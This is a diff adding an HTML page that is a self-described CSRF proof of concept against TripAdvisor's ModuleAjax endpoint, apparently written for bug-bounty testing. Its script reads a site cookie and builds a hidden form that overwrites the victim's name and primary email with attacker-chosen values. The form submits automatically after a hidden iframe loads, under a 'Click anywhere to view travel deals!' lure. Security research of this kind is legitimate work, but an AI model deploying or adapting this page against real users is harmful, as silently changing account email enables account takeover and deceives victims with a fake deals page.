@@ -1,1 +1,77 @@
+<html>
+<body>
+  <script>
+  console.log("[1] Initializing CSRF PoC...");
 
+  // ====== Cookie Extraction ======
+  function getCookie(name) {
+    const cookies = document.cookie.split('; ');
+    const cookie = cookies.find(c => c.startsWith(name + '='));
+    return cookie ? decodeURIComponent(cookie.split('=')[1]) : null;
+  }
+
+  const roybattyToken = getCookie('roybatty');
+  console.log("[2] roybatty cookie value:", roybattyToken);
+
+  // ====== Request Builder ======
+  const form = document.createElement('form');
+  form.method = 'POST';
+  form.action = 'https://www.tripadvisor.com/ModuleAjax';
+  form.style.display = 'none';
+
+  const params = {
+    actions: JSON.stringify([{
+      params: {
+        firstname: "ziadbugcrowd",
+        lastname: "test", 
+        primaryEmail: "ziad686@bugcrowdninja.com"
+      },
+      name: "SAVE",
+      resource: "modules.common.entity.LoggedInMember"
+    }]),
+    context: JSON.stringify({
+      "modules.membercenter.model.ContributionCounts": [{
+        memberId: "FOY3v6GnNeOB/lMD3V9UCA=="
+      }]
+    }),
+    authenticator: "Random",
+    version: "5",
+    token: roybattyToken
+  };
+
+  Object.entries(params).forEach(([key, value]) => {
+    const input = document.createElement('input');
+    input.type = 'hidden';
+    input.name = key;
+    input.value = value;
+    form.appendChild(input);
+  });
+
+  // ====== Debugging Interface ======
+  console.log("[3] Form parameters:", params);
+  console.log("[4] Form HTML:", form.outerHTML);
+
+  // ====== Execution Flow ======
+  document.body.appendChild(form);
+  console.log("[5] Form added to DOM");
+
+  // Create hidden iframe for cookie context
+  const iframe = document.createElement('iframe');
+  iframe.style.display = 'none';
+  iframe.src = 'https://www.tripadvisor.com';
+  
+  iframe.onload = () => {
+    console.log("[6] Security context established");
+    setTimeout(() => {
+      console.log("[7] Submitting form...");
+      form.submit();
+    }, 1000);
+  };
+
+  document.body.appendChild(iframe);
+  </script>
+
+  <!-- Visual Trigger -->
+  <h1 style="color:red">Click anywhere to view travel deals!</h1>
+</body>
+</html>
